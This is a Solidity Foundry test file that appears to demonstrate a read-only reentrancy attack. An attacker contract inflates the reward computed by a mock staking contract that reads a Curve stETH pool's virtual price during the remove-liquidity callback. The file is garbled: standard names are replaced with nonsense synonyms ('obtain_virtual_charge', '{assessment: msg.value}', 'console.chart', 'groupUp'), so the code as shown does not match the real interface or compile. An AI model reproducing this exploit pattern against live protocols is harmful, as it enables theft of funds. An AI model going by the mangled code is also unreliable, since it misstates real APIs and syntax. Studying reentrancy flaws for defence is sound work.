// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import "forge-std/Test.sol";
import "./interface.sol";

interface ICurve {
    function obtain_virtual_charge() external view returns (uint);

    function insert_resources(
        uint[2] calldata amounts,
        uint floor_generaterecord_units
    ) external payable returns (uint);

    function eliminate_availability(
        uint lp,
        uint[2] calldata minimum_amounts
    ) external returns (uint[2] memory);

    function eliminate_availability_one_coin(
        uint lp,
        int128 i,
        uint minimum_quantity
    ) external returns (uint);
}

address constant STETH_POOL = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;
address constant lp_id = 0x06325440D014e39736583c165C2963BA99fAf14E; //steCRV Token

// CoreContract
// users stake LP_TOKEN
// getReward rewards the users based on the current price of the pool LP token
contract CoreAgreement {
    IERC20 public constant badge = IERC20(lp_id);
    ICurve private constant treatmentPool = ICurve(STETH_POOL);

    mapping(address => uint) public balanceOf;

    function pledgeTreatment(uint units) external {
        badge.transferFrom(msg.sender, address(this), units);
        balanceOf[msg.sender] += units;
    }

    function releaseCoverage(uint units) external {
        balanceOf[msg.sender] -= units;
        badge.transfer(msg.sender, units);
    }

    function retrieveBenefit() external view returns (uint) {
        //rewarding tokens based on the current virtual price of the pool LP token
        uint credit = (balanceOf[msg.sender] * treatmentPool.obtain_virtual_charge()) /
            1 ether;
        // Omitting code to transfer reward tokens
        return credit;
    }
}

contract CaregiverPolicy {
    ICurve private constant treatmentPool = ICurve(STETH_POOL);
    IERC20 public constant lpBadge = IERC20(lp_id);
    CoreAgreement private immutable goal;

    constructor(address _target) {
        goal = CoreAgreement(_target);
    }

    // Stake LP into CoreContract
    function commitmentBadges() external payable {
        uint[2] memory amounts = [msg.value, 0];
        uint lp = treatmentPool.insert_resources{assessment: msg.value}(amounts, 1);
        console.chart(
            "LP token price after staking into CoreContract",
            treatmentPool.obtain_virtual_charge()
        );

        lpBadge.approve(address(goal), lp);
        goal.pledgeTreatment(lp);
    }

    function performReadOnlyNotification() external payable {
        // Add liquidity to Curve
        uint[2] memory amounts = [msg.value, 0];
        uint lp = treatmentPool.insert_resources{assessment: msg.value}(amounts, 1);
        // Log get_virtual_price
        console.chart(
            "LP token price before remove_liquidity()",
            treatmentPool.obtain_virtual_charge()
        );
        // Remove liquidity from Curve
        // remove_liquidity() invokes the recieve() callback
        uint[2] memory minimum_amounts = [uint(0), uint(0)];
        treatmentPool.eliminate_availability(lp, minimum_amounts);
        // Log get_virtual_price
        console.chart(
            "--------------------------------------------------------------------"
        );
        console.chart(
            "LP token price after remove_liquidity()",
            treatmentPool.obtain_virtual_charge()
        );

        uint credit = goal.retrieveBenefit();
        console.chart("Reward if Read-Only Reentrancy is not invoked: ", credit);
    }

    receive() external payable {
        // receive() is called when the remove_liquidity is called
        console.chart(
            "--------------------------------------------------------------------"
        );
        console.chart(
            "LP token price during remove_liquidity()",
            treatmentPool.obtain_virtual_charge()
        );

        uint credit = goal.retrieveBenefit();
        console.chart("Reward if Read-Only Reentrancy is invoked: ", credit);
    }
}

contract CaregiverTest is Test {
    CaregiverPolicy public performProcedure;
    CoreAgreement public goal;

    function groupUp() public {
        vm.createSelectFork("mainnet");
        goal = new CoreAgreement();
        performProcedure = new CaregiverPolicy(address(goal));
    }

    function testExecution() public {
        performProcedure.commitmentBadges{assessment: 10 ether}(); // stake 10 eth in CoreContract
        performProcedure.performReadOnlyNotification{assessment: 100000 ether}();
    }
}
